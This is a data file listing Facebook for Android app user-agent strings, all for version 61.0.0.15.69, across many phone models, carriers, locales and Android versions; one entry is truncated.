  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=854};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VF-795;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=888};FBLC/en_GB;FBCR/Virgin;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D2303;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=888};FBLC/es_ES;FBCR/Personal;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoE2(4G-LTE);FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/vodafone ES;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=720,height=1208};FBLC/en_US;FBCR/IDEA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5322;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1196,height=720};FBLC/en_GB;FBCR/3;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1196,height=720};FBLC/en_US;FBCR/Tesco Mobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_US;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1536,height=1952};FBLC/en_GB;FBCR/;FBMF/htc;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 9;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1920,height=1104};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L21;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Claro;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/O2-IRL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/vodafone UK;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Bell;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Emergency calls only;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI SCL-L01;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Meteor;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Tesco Mobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/eir;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2303;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/iD;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2303;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/hu_HU;FBCR/Telekom HU;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/pl_PL;FBCR/Lycamobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1196};FBLC/en_GB;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D722;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IDEA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N750;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IND airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E700H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850W;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/eMobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/sv_SE;FBCR/halebop;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500FN;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=768,height=1184};FBLC/en_GB;FBCR/Virgin;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 4;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=1.75,width=720,height=1280};FBLC/en_GB;FBCR/Tesco Mobile;FBMF/Archos;FBBD/Archos;FBPN/com.facebook.katana;FBDV/Bush 5",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/Tesco Mobile;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/eir;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/eir;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/voda UK;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/vodafone IE;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/vodafone UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/vodafone UK;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/3 IRL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/AT&-T;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Meteor;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Meteor;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/TELKOMSEL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6903;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/VIRGIN;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/VIRGIN;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Videotron;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1563;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/eir;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_ES;FBCR/movistar;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC_A9u;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_ES;FBCR/movistar;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1097;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/TIGO;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6902;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/pl_PL;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/pl_PL;FBCR/Lycamobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1794};FBLC/en_US;FBCR/3;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI GRA-L09;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1794};FBLC/en_US;FBCR/Meteor;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI GRA-L09;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBCR/Vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9295;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBCR/Vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBCR/o2 - de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/3 IRL;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/3;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/EE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/EE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/eMobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/vodafone IE;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
